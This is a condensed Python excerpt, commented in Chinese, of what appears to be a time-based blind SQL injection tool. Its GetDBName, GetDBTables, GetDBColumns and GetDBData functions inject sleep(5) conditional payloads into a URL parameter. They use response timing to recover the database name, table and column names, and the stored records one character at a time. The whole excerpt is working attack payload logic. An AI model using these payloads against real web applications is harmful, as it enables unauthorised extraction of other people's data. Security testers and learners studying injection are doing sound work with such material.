...
def GetDBName(url, urlend, cookies):
    ...
    DBNameLen = 0
    #用来检查数据库名的payload
    payload = " 1' and if(length(database())={0},sleep(5),0) %23 "
    ...
    print("[-]开始获取数据库名")
    payload = " 1' and if(ascii(substr(database(),{0},1)) = {1},sleep(5),0) %23"
    targetUrl = url + payload + urlend
    # a表示substr()函数的截取起始位置
...
def GetDBTables(url, urlend, cookies, dbname):
	...
	#获取数据库表数量的payload
	payload = "1' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},sleep(5),0) %23"
	targetUrl = url + payload + urlend
	#开始遍历获取数据库表的数量
	...
	for a in range(0,DBTableCount):
		...
		for tableLen in range(1, 99):
			payload = "1' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},sleep(5),0) %23"
			targetUrl = url + payload +urlend
			timeStart = time.time()
		...
		for b in range(1, tableLen+1):
			payload = "1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},sleep(5),0) %23"
			targetUrl = url + payload + urlend
...
def GetDBColumns(url, urlend, cookies, dbname, dbtable):
	...
	for DBColumnCount in range(99):
		payload = "1' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},sleep(5),0) %23"
		targetUrl = url + payload + urlend
		timeStart = time.time()
	...
	for a in range(0, DBColumnCount):
		...
		for columnLen in range(1,99):
			payload = "1'and if((select length(column_name) from information_schema.columns where table_schema=  '{0}' and table_name='{1}'   limit {2},1)={3},sleep(5),0) %23"
			targetUrl = url+ payload + urlend
			timeStart = time.time()
		...
		for b in range(1, columnLen+1):
			payload = "1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},sleep(5),0) %23"
			targetUrl = url + payload + urlend
            # c表示33~127位ASCII中可显示字符
			for c in range(33,128):
				timeStart = time.time()
...
def GetDBData(url, urlend, cookies, dbtable, dbcolumn):
	...
	for DBDataCount in range(99):
		payload = "1'and if ((select count({0}) from {1})={2},sleep(5),0)  %23"
		targetUrl = url + payload + urlend
		timeStart = time.time()
	...
	for a in range(0, DBDataCount):
		...
		for dataLen in range(99):
			payload = "1'and if ((select length({0}) from {1} limit {2},1)={3},sleep(5),0)  %23"
			targetUrl = url + payload + urlend
			timeStart = time.time()
		...
		for b in range(1, dataLen+1):
			for c in range(33, 128):
				payload = "1'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},sleep(5),0)  %23"
				targetUrl = url + payload + urlend
				timeStart = time.time()
